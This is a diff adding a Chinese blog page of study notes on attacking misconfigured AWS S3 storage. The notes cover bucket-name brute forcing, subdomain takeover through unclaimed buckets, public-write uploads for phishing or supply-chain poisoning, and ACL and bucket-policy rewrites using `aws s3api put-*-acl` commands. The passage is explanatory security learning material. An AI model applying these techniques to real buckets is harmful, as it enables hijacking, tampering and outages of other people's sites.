@@ -1,0 +1,1062 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    
+    <meta property="og:site_name" content="Muscial Blog">
+    <meta property="og:type" content="article">
+
+    
+    <meta property="og:image" content="https://muscial.github.io/img/bizhi.jpg">
+    <meta property="twitter:image" content="https://muscial.github.io/img/bizhi.jpg" />
+    
+
+    
+    <meta name="title" content="" />
+    <meta property="og:title" content="" />
+    <meta property="twitter:title" content="" />
+    
+
+    
+    <meta name="description" content="Muscial">
+    <meta property="og:description" content="Muscial" />
+    <meta property="twitter:description" content="Muscial" />
+    
+
+    
+    <meta property="twitter:card" content="summary" />
+    
+    
+
+    <meta name="keyword"  content="Muscial">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>Muscial的博客 | 保持冷静，奋不顾身</title>
+
+    <link rel="canonical" href="/post/%E4%BA%91%E6%9C%8D%E5%8A%A1/">
+
+    
+    
+    
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    
+    <link rel="stylesheet" href="/css/hugo-theme-cleanwhite.min.css">
+
+    
+    <link rel="stylesheet" href="/css/zanshang.css">
+
+    
+    <link href="https://cdn.jsdelivr.net/gh/FortAwesome/Font-Awesome@5.15.1/css/all.css" rel="stylesheet" type="text/css">
+
+    
+    
+
+    
+    <script src="/js/jquery.min.js"></script>
+
+    
+    <script src="/js/bootstrap.min.js"></script>
+
+    
+    <script src="/js/hux-blog.min.js"></script>
+
+    
+    <script src="/js/lazysizes.min.js"></script>
+
+    
+    
+
+</head>
+
+
+
+
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+
+    <div class="container-fluid">
+        
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Muscial Blog</a>
+        </div>
+
+        
+        
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">All Posts</a>
+                    </li>
+                    
+                        
+                        <li>
+                            <a href="/categories/tech">tech</a>
+                        </li>
+                        
+                    
+                    
+		    
+                        <li><a href="/archive/">ARCHIVE</a></li>
+                    
+                        <li><a href="/notes/">NOTES</a></li>
+                    
+                        <li><a href="/about/">ABOUT</a></li>
+                    
+
+                    
+		    <li>
+                        <a href="/search"><i class="fa fa-search"></i></a>
+		    </li>
+                    
+                </ul>
+            </div>
+        </div>
+        
+    </div>
+    
+</nav>
+<script>
+    
+    
+    
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        
+            $navbar.className = " ";
+            
+            setTimeout(function(){
+                
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+
+
+<style type="text/css">
+    header.intro-header {
+        background-image: url('/img/bizhi.jpg')
+    }
+</style>
+
+<header class="intro-header" >
+
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                    </div>
+                    <h1></h1>
+                    <h2 class="subheading"></h2>
+                    <span class="meta">
+                        
+                            Posted by 
+                            
+                                    Muscial Blog
+                             
+                            on 
+                            Monday, January 1, 0001
+                            
+                            
+                            
+                            
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+
+
+
+<article>
+    <div class="container">
+        <div class="row">
+
+            
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                
+                <h1 id="云服务">云服务</h1>
+<h1 id="前言">前言</h1>
+<p>自己根据twiki总结的，很多地方没复现，没钱开实例，后续遇到了可以补一下</p>
+<p>还有几个复杂的没看pgsql的ssrf待补吧</p>
+<p>主要还是认识下攻击方式</p>
+<h1 id="云服务-1">云服务</h1>
+<p>云服务，顾名思义就是云上的服务（网盘，虚拟机，数据库），简单的来说就是在云厂商（例如 AWS、阿里云）那里买的服务。</p>
+<p>目前国内云厂商有阿里云、腾讯云、华为云、天翼云、Ucloud、金山云等等，国外有亚马逊的 AWS、Google 的 GCP、微软的 Azure 等等。</p>
+<p>各个云厂商对云服务的叫法都不统一，这里统一以 AWS 为例。</p>
+<p>S3 对象存储<code>Simple Storage Service</code>，简单的说就是一个类似网盘的东西，当然跟网盘是有一定区别的。</p>
+<p>EC2 即弹性计算服务<code>Elastic Compute Cloud</code>，简单的说就是在云上的一台虚拟机。</p>
+<p>RDS 云数据库<code>Relational Database Service</code>，简单的说就是云上的一个数据库。</p>
+<p>IAM 身份和访问管理<code>Identity and Access Management</code>，简单的说就是云控制台上的一套身份管理服务，可以用来管理每个子账号的权限。</p>
+<h1 id="对象存储">对象存储</h1>
+<p>对象存储（Object-Based Storage），也可以叫做面向对象的存储，现在也有不少厂商直接把它叫做云存储。</p>
+<p>对象存储基本上缩写有os（Object ,storage 阿里云的oss</p>
+<p>对象存储经典s3协议，主流厂商都支持</p>
+<p>在 Amazon S3 标准下中，对象存储中可以有多个桶（Bucket），然后把对象（Object）放在桶里，对象又包含了三个部分：<code>Key</code>、<code>Data</code> 和<code>Metadata</code></p>
+<p>
+  <img src="%E4%BA%91%E6%9C%8D%E5%8A%A1%202bc370f4b05641a7baade919fdeb6e13/Untitled.png" alt="Untitled">
+
+</p>
+<ul>
+<li>Key 是指存储桶中的唯一标识符，例如一个 URL 为：https://teamssix.s3.ap-northeast-2.amazonaws.com/flag，这里的 teamssix 是存储桶 Bucket 的名称，/flag 就是 Key</li>
+<li>Data 就很容易理解，就是存储的数据本体</li>
+<li>Metadata 即元数据，可以简单的理解成数据的标签、描述之类的信息，这点不同于传统的文件存储，在传统的文件存储中这类信息是直接封装在文件里的，有了元数据的存在，可以大大的加快对象的排序、分类和查找。</li>
+</ul>
+<h1 id="bucket遇到的洞">Bucket遇到的洞</h1>
+<p>我们把bucket想象成一个专门做成网站的网盘。类似资源管理网页，会有什么洞？</p>
+<h3 id="buckct目录爆破还有key">buckct目录爆破，还有key</h3>
+<p>当不知道 Bucket 名称的时候，可以通过爆破获得 Bucket 名称，这有些类似于目录爆破，只不过目录爆破一般通过状态码判断，而这个通过页面的内容判断。</p>
+<p>当 Bucket 不存在时有两种返回情况，分别是 InvalidBucketName 和 NoSuchBucket</p>
+<p>
+  <img src="%E4%BA%91%E6%9C%8D%E5%8A%A1%202bc370f4b05641a7baade919fdeb6e13/Untitled%201.png" alt="Untitled">
+
+</p>
+<p>当 Bucket 存在时也会有两种情况，一种是列出 Object（flag metadata data</p>
+<p>
+  <img src="%E4%BA%91%E6%9C%8D%E5%8A%A1%202bc370f4b05641a7baade919fdeb6e13/Untitled%202.png" alt="Untitled">
+
+</p>
+<p>另一种是返回 AccessDenied</p>
+<p>
+  <img src="%E4%BA%91%E6%9C%8D%E5%8A%A1%202bc370f4b05641a7baade919fdeb6e13/Untitled%203.png" alt="Untitled">
+
+</p>
+<p>url 带s3确认是对象存储</p>
+<p>可以爆破key看object</p>
+<h3 id="cname">cname</h3>
+<p>CNAME记录，也叫别名记录,就相当于给域名起个小名，云服务的url带有信息，防止信息泄露，可以起个cname？ 我猜的但感觉是</p>
+<p><a href="http://www.muscial.s3.ap-northeast-2-amazonaws.com">www.muscial.s3.ap-northeast-2-amazonaws.com</a> →c记录 <a href="http://www.msucial-buckect.com">www.msucial-buckect.com</a> →a记录 1.1.1.1</p>
+<p>可以通过nslookup，dig查询cname</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>┌──(root㉿Muscial)<span style="color:#ff79c6">-</span>[/mnt/c/Users/Administrator]
+</span></span><span style="display:flex;"><span>└─# nslookup <span style="color:#ff79c6">-</span>qt<span style="color:#ff79c6">=</span>cname www.baidu.com
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">***</span> Invalid option<span style="color:#ff79c6">:</span> qt<span style="color:#ff79c6">=</span>cname
+</span></span><span style="display:flex;"><span>Server<span style="color:#ff79c6">:</span>         <span style="color:#bd93f9">172.27.64.1</span>
+</span></span><span style="display:flex;"><span>Address<span style="color:#ff79c6">:</span>        <span style="color:#bd93f9">172.27.64.1</span>#<span style="color:#bd93f9">53</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Non<span style="color:#ff79c6">-</span>authoritative answer<span style="color:#ff79c6">:</span>
+</span></span><span style="display:flex;"><span>www.baidu.com   canonical name <span style="color:#ff79c6">=</span> www.a.shifen.com.
+</span></span><span style="display:flex;"><span>Name<span style="color:#ff79c6">:</span>   www.a.shifen.com
+</span></span><span style="display:flex;"><span>Address<span style="color:#ff79c6">:</span> <span style="color:#bd93f9">183.2.172.42</span>
+</span></span><span style="display:flex;"><span>Name<span style="color:#ff79c6">:</span>   www.a.shifen.com
+</span></span><span style="display:flex;"><span>Address<span style="color:#ff79c6">:</span> <span style="color:#bd93f9">183.2.172.185</span>
+</span></span><span style="display:flex;"><span>Name<span style="color:#ff79c6">:</span>   www.a.shifen.com
+</span></span><span style="display:flex;"><span>Address<span style="color:#ff79c6">:</span> <span style="color:#bd93f9">240</span>e<span style="color:#ff79c6">:</span>ff<span style="color:#ff79c6">:</span>e020<span style="color:#ff79c6">:</span><span style="color:#bd93f9">966</span><span style="color:#ff79c6">:</span><span style="color:#bd93f9">0</span><span style="color:#ff79c6">:</span>ff<span style="color:#ff79c6">:</span>b042<span style="color:#ff79c6">:</span>f296
+</span></span><span style="display:flex;"><span>Name<span style="color:#ff79c6">:</span>   www.a.shifen.com
+</span></span><span style="display:flex;"><span>Address<span style="color:#ff79c6">:</span> <span style="color:#bd93f9">240</span>e<span style="color:#ff79c6">:</span>ff<span style="color:#ff79c6">:</span>e020<span style="color:#ff79c6">:</span><span style="color:#bd93f9">9</span>ae<span style="color:#ff79c6">:</span><span style="color:#bd93f9">0</span><span style="color:#ff79c6">:</span>ff<span style="color:#ff79c6">:</span>b014<span style="color:#ff79c6">:</span><span style="color:#bd93f9">8</span>e8b
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──(root㉿Muscial)<span style="color:#ff79c6">-</span>[/mnt/c/Users/Administrator]
+</span></span><span style="display:flex;"><span>└─# dig www.baidu.com
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>; <span style="color:#ff79c6">&lt;&lt;&gt;&gt;</span> DiG <span style="color:#bd93f9">9.19.17</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span><span style="color:#ff79c6">-</span>Debian <span style="color:#ff79c6">&lt;&lt;&gt;&gt;</span> www.baidu.com
+</span></span><span style="display:flex;"><span>;; global options<span style="color:#ff79c6">:</span> <span style="color:#ff79c6">+</span>cmd
+</span></span><span style="display:flex;"><span>;; Got answer<span style="color:#ff79c6">:</span>
+</span></span><span style="display:flex;"><span>;; <span style="color:#ff79c6">-&gt;&gt;</span>HEADER<span style="color:#ff79c6">&lt;&lt;-</span> opcode<span style="color:#ff79c6">:</span> QUERY, status<span style="color:#ff79c6">:</span> NOERROR, id<span style="color:#ff79c6">:</span> <span style="color:#bd93f9">63997</span>
+</span></span><span style="display:flex;"><span>;; flags<span style="color:#ff79c6">:</span> qr rd ad; QUERY<span style="color:#ff79c6">:</span> <span style="color:#bd93f9">1</span>, ANSWER<span style="color:#ff79c6">:</span> <span style="color:#bd93f9">3</span>, AUTHORITY<span style="color:#ff79c6">:</span> <span style="color:#bd93f9">0</span>, ADDITIONAL<span style="color:#ff79c6">:</span> <span style="color:#bd93f9">0</span>
+</span></span><span style="display:flex;"><span>;; WARNING<span style="color:#ff79c6">:</span> recursion requested but not available
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>;; QUESTION SECTION<span style="color:#ff79c6">:</span>
+</span></span><span style="display:flex;"><span>;www.baidu.com.                 IN      A
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>;; ANSWER SECTION<span style="color:#ff79c6">:</span>
+</span></span><span style="display:flex;"><span>www.baidu.com.          <span style="color:#bd93f9">0</span>       IN      CNAME   www.a.shifen.com.
+</span></span><span style="display:flex;"><span>www.a.shifen.com.       <span style="color:#bd93f9">0</span>       IN      A       <span style="color:#bd93f9">183.2.172.42</span>
+</span></span><span style="display:flex;"><span>www.a.shifen.com.       <span style="color:#bd93f9">0</span>       IN      A       <span style="color:#bd93f9">183.2.172.185</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>;; Query time<span style="color:#ff79c6">:</span> <span style="color:#bd93f9">0</span> msec
+</span></span><span style="display:flex;"><span>;; SERVER<span style="color:#ff79c6">:</span> <span style="color:#bd93f9">172.27.64.1</span>#<span style="color:#bd93f9">53</span>(<span style="color:#bd93f9">172.27.64.1</span>) (UDP)
+</span></span><span style="display:flex;"><span>;; WHEN<span style="color:#ff79c6">:</span> Fri Jan <span style="color:#bd93f9">26</span> <span style="color:#bd93f9">13</span><span style="color:#ff79c6">:</span><span style="color:#bd93f9">10</span><span style="color:#ff79c6">:</span><span style="color:#bd93f9">44</span> CST <span style="color:#bd93f9">2024</span>
+</span></span><span style="display:flex;"><span>;; MSG SIZE  rcvd<span style="color:#ff79c6">:</span> <span style="color:#bd93f9">122</span>
+</span></span></code></pre></div><h3 id="buckct接管-被夺舍">buckct接管 ，被夺舍</h3>
+<p>网站 是s3 对象存储的云服务，但是没桶（网盘，我们就可以夺舍,夺舍了 该网站的子域名就归我们管了 可以上传文件</p>
+<p>一般没网盘 是 nosuchbuctet</p>
+<p>
+  <img src="%E4%BA%91%E6%9C%8D%E5%8A%A1%202bc370f4b05641a7baade919fdeb6e13/Untitled%204.png" alt="Untitled">
+
+</p>
+<p>通过 cname 记录，可以判断出这是一个 Amazon 的 S3，而且页面显示 NoSuchBucket，说明这个 Bucket 可以接管的，同时 Bucket 的名称在页面中也告诉了我们，为 <code>test.teamssix.com</code></p>
+<p>那么我们就直接在 AWS 控制台里创建一个名称为 <code>test.teamssix.com</code> 的 Bucket 就可以接管了</p>
+<p>
+  <img src="%E4%BA%91%E6%9C%8D%E5%8A%A1%202bc370f4b05641a7baade919fdeb6e13/Untitled%205.png" alt="Untitled">
+
+</p>
+<p>创建完 Bucket 后，再次访问发现就显示 AccessDenied 了，说明该 Bucket 已经被我们接管了。</p>
+<p>
+  <img src="%E4%BA%91%E6%9C%8D%E5%8A%A1%202bc370f4b05641a7baade919fdeb6e13/Untitled%206.png" alt="Untitled">
+
+</p>
+<p>将该 Bucket 设置为公开，并上传个文件试试</p>
+<p>
+  <img src="%E4%BA%91%E6%9C%8D%E5%8A%A1%202bc370f4b05641a7baade919fdeb6e13/Untitled%207.png" alt="Untitled">
+
+</p>
+<p>在该子域名下访问这个 test.txt 文件</p>
+<p>
+  <img src="%E4%BA%91%E6%9C%8D%E5%8A%A1%202bc370f4b05641a7baade919fdeb6e13/Untitled%208.png" alt="Untitled">
+
+</p>
+<p>可以看到通过接管 Bucket 成功接管了这个子域名的权限</p>
+<p>本质是通过没有设置的云服务来控制服务器</p>
+<h2 id="对象存储的任意文件上传">对象存储的任意文件上传</h2>
+<p>配置时候把公共读写打开了，就可以通过put的http请求上传任意文件</p>
+<p>
+  <img src="%E4%BA%91%E6%9C%8D%E5%8A%A1%202bc370f4b05641a7baade919fdeb6e13/Untitled%209.png" alt="Untitled">
+
+</p>
+<p>一般不解析php，但是解析HTML</p>
+<p>那就可以利用任意文件上传进行 XSS 钓鱼、挂暗链、挂黑页、供应链投毒等操作</p>
+<h2 id="bucket-acl-可写"><strong>Bucket ACL 可写</strong></h2>
+<h3 id="利用条件">利用条件</h3>
+<p>有ak，不然登不了aws</p>
+<h3 id="acl">acl</h3>
+<p>ACL 即 Access Control Lists（访问控制列表）这里说的 ACL 是指 Bucket ACL，是基于 Bucket（存储桶）资源的访问策略之一。使用 ACL 可以向其他用户授予读写权限。</p>
+<p>把acl比作一个仓库管理员，规定了谁可以来看，谁可以来存储东西，拿走东西，谁不许进入</p>
+<h3 id="acl-的结构"><strong>ACL 的结构</strong></h3>
+<p>一个 Bucket ACL 可以认为由多个 AC（Access Control）规则组成，AC 规则结构如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;grantee&#34;</span><span style="color:#ff79c6">:</span> {
+</span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;type&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;user or group&#34;</span>,
+</span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;id&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;userid or QS_ALL_USERS&#34;</span>
+</span></span><span style="display:flex;"><span>},
+</span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;permission&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;READ or WRITE or FULL_CONTROL&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>AC 规则包含两个结构：grantee 授权对象和 permission 权限</p>
+<h3 id="grantee-授权对象"><strong>grantee 授权对象</strong></h3>
+<p>授权对象分两类：user 和 group。</p>
+<p>当为 group 时，意味着授权对象为一个群组，目前只支持 group 为 QS_ALL_USERS，授权对象为所有用户，此时用户可以是在系统注册的用户，也可以是未在系统注册的用户（即跳过用户身份验证的匿名用户）。</p>
+<p>这里是用的预定义的组，grantee url 修改成alluser 任何人可读可以写</p>
+<p>
+  <img src="%E4%BA%91%E6%9C%8D%E5%8A%A1%202bc370f4b05641a7baade919fdeb6e13/Untitled%2010.png" alt="Untitled">
+
+</p>
+<h3 id="permission-权限"><strong>permission 权限</strong></h3>
+<p>包括三种类型权限：</p>
+<ul>
+<li>READ（读） 可以读该 Bucket 中的数据。</li>
+<li>WRITE（写） 可以往该 Bucket 的上传、删除数据。</li>
+<li>FULL_CONTROL（读写）拥有 READ 和 WRITE 权限，可读、上传、删除数据。</li>
+</ul>
+<p>通过官方文档，可以分析出这个策略表示任何人都可以访问、写入当前 Bucket 的 ACL</p>
+<p>那么也就是说如果我们把权限修改为 FULL_CONTROL 后，就可以控制这个 Bucket 了，最后修改后的策略如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;Owner&#34;</span><span style="color:#ff79c6">:</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;ID&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;d24***5&#34;</span>
+</span></span><span style="display:flex;"><span>    },
+</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;Grants&#34;</span><span style="color:#ff79c6">:</span> [
+</span></span><span style="display:flex;"><span>	{
+</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#34;Grantee&#34;</span><span style="color:#ff79c6">:</span> {
+</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#34;Type&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;Group&#34;</span>, 
+</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#34;URI&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;http://acs.amazonaws.com/groups/global/AllUsers&#34;</span>
+</span></span><span style="display:flex;"><span>            }, 
+</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#34;Permission&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;FULL_CONTROL&#34;</span>
+</span></span><span style="display:flex;"><span>        } 
+</span></span><span style="display:flex;"><span>    ]
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="攻击">攻击</h3>
+<p>看acl</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>aws s3api get<span style="color:#ff79c6">-</span>bucket<span style="color:#ff79c6">-</span>acl <span style="color:#ff79c6">--</span>bucket teamssix
+</span></span></code></pre></div><p>写入策略</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>aws s3api put<span style="color:#ff79c6">-</span>bucket<span style="color:#ff79c6">-</span>acl <span style="color:#ff79c6">--</span>bucket teamssix <span style="color:#ff79c6">--</span>access<span style="color:#ff79c6">-</span>control<span style="color:#ff79c6">-</span>policy file<span style="color:#ff79c6">:</span><span style="color:#6272a4">//acl.json
+</span></span></span></code></pre></div><h2 id="修改对象acl">修改对象acl</h2>
+<p>本质是acl错误配置，给别人可读可写了</p>
+<p>和修改buckect acl 差不多命令换成 get-object-cal 了</p>
+<p>读</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>aws s3api get<span style="color:#ff79c6">-</span>object<span style="color:#ff79c6">-</span>acl <span style="color:#ff79c6">--</span>bucket teamssix <span style="color:#ff79c6">--</span>key flag
+</span></span></code></pre></div><p>这个策略和上面的 Bucket ACL 策略一样，表示任何人都可以访问、写入当前 ACL，但是不能读取、写入对象</p>
+<p>将权限修改为 FULL_CONTROL 后，Object ACL 策略如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&#34;Owner&#34;</span>: {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&#34;ID&#34;</span>: <span style="color:#f1fa8c">&#34;d24***5&#34;</span>
+</span></span><span style="display:flex;"><span>    },
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&#34;Grants&#34;</span>: [
+</span></span><span style="display:flex;"><span>	{
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;Grantee&#34;</span>: {
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&#34;Type&#34;</span>: <span style="color:#f1fa8c">&#34;Group&#34;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&#34;URI&#34;</span>: <span style="color:#f1fa8c">&#34;http://acs.amazonaws.com/groups/global/AllUsers&#34;</span>
+</span></span><span style="display:flex;"><span>            },
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;Permission&#34;</span>: <span style="color:#f1fa8c">&#34;FULL_CONTROL&#34;</span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    ]
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>1234567891011121314</p>
+<p>将该策略写入后，就可以读取对象了</p>
+<p><code>aws s3api put-object-acl --bucket teamssix --key flag --access-control-policy file://acl.json</code></p>
+<h2 id="bucket-策略可写改桶的策略要有ak">bucket 策略可写(改桶的策略要有ak</h2>
+<p>先看下bucket 策略</p>
+<p>官方文档：<a href="https://docs.aws.amazon.com/zh_cn/AmazonS3/latest/userguide/access-policy-language-overview.html">https://docs.aws.amazon.com/zh_cn/AmazonS3/latest/userguide/access-policy-language-overview.html</a></p>
+<p>说下几个比较关键的键</p>
+<p>Resoure:</p>
+<ul>
+<li><code>&quot;Resource&quot;: &quot;arn:aws:s3:::*bucket_name*&quot;</code>.</li>
+</ul>
+<p>对象级操作示例：</p>
+<ul>
+<li><code>&quot;Resource&quot;: &quot;arn:aws:s3:::*bucket_name/**&quot;</code> 对应于存储桶中的所有对象。</li>
+<li><code>&quot;Resource&quot;: &quot;arn:aws:s3:::*bucket_name/prefix/**&quot;</code> 对应于存储桶中特定前缀下的对象。</li>
+</ul>
+<p>资源可以看桶的名字，可以拼接处完整的url</p>
+<p>www.{buckct.name}.s3.<a href="http://amazonaws.com/">amazonaws.com</a></p>
+<p><a href="https://docs.aws.amazon.com/zh_cn/AmazonS3/latest/userguide/using-with-s3-actions.html">Action</a> – 对于每个资源，Amazon S3 支持一组操作。您可使用操作关键字（Effect）标识允许（或拒绝）的资源操作。</p>
+<p>例如，使用 <code>s3:ListBucket</code> 权限，用户可以使用 Amazon S3 <a href="https://docs.aws.amazon.com/AmazonS3/latest/API/RESTBucketGET.html">GET Bucket (List Objects)</a> 操作</p>
+<p><a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_elements_effect.html">Effect</a> – 当用户请求特定操作（可以是 <em>allow</em> 或 <em>deny</em>）时的效果。</p>
+<p>如果没有显式授予 (允许) 对资源的访问权限，则隐式拒绝访问。您也可显式拒绝对资源的访问。您可以执行此操作以确保用户无法访问资源，即使其他策略授予访问权限也是如此</p>
+<ul>
+<li><a href="https://docs.aws.amazon.com/zh_cn/AmazonS3/latest/userguide/s3-bucket-user-policy-specifying-principal-intro.html">主体</a> – 允许访问语句中的操作和资源的账户或用户。在存储桶策略中，主体是作为此权限的接收者的用户、账户、服务或其他实体。有关更多信息，请参阅 <a href="https://docs.aws.amazon.com/zh_cn/AmazonS3/latest/userguide/s3-bucket-user-policy-specifying-principal-intro.html">主体</a>。</li>
+<li><a href="https://docs.aws.amazon.com/zh_cn/AmazonS3/latest/userguide/amazon-s3-policy-keys.html">Condition</a> – 策略生效时的条件。您可以使用 AWS 范围内的键和特定于 Amazon S3 的键来指定 Amazon S3 访问策略中的条件。有关更多信息，请参阅 <a href="https://docs.aws.amazon.com/zh_cn/AmazonS3/latest/userguide/amazon-s3-policy-keys.html">Amazon S3 条件键示例</a>。</li>
+</ul>
+<p>下面来个实例解释下bucket 策略</p>
+<p>
+  <img src="%E4%BA%91%E6%9C%8D%E5%8A%A1%202bc370f4b05641a7baade919fdeb6e13/Untitled%2011.png" alt="Untitled">
+
+</p>
+<h3 id="本漏洞的实例">本漏洞的实例</h3>
+<p>大的桶的url定义了运行桶的策略可读可写</p>
+<p>小的url-》key定义了获得对象但是Deny</p>
+<p>这个时候修改大桶的策略就行了</p>
+<p>
+  <img src="%E4%BA%91%E6%9C%8D%E5%8A%A1%202bc370f4b05641a7baade919fdeb6e13/Untitled%2012.png" alt="Untitled">
+
+</p>
+<h2 id="实际利用">实际利用</h2>
+<p>这就看wiki的吧</p>
+<p>如果网站调用的是桶里的静态js文件，就可以修改js</p>
+<p>也可以把策略改成deny使得网站瘫痪</p>
+<h2 id="bucket-object-遍历"><strong>Bucket Object 遍历</strong></h2>
+<p>在 s3 中Action:如果在 Bucket 策略处，设置了 s3:ListBucket 的策略，就会导致 Bucket Object 遍历</p>
+<p>直接curl或者打开网页</p>
+<h2 id="特定的-bucket-策略配置"><strong>特定的 Bucket 策略配置</strong></h2>
+<p>配置在bucket 策略里的condition键值对里面</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#34;Version&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;2012-10-17&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#34;Statement&#34;</span><span style="color:#ff79c6">:</span> [
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Sid&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;statement1&#34;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Effect&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;Allow&#34;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Principal&#34;</span><span style="color:#ff79c6">:</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;AWS&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;arn:aws:iam::AccountB-ID:user/Dave&#34;</span>
+</span></span><span style="display:flex;"><span>      },
+</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Action&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;s3:PutObject&#34;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Resource&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;arn:aws:s3:::awsexamplebucket1/*&#34;</span>,
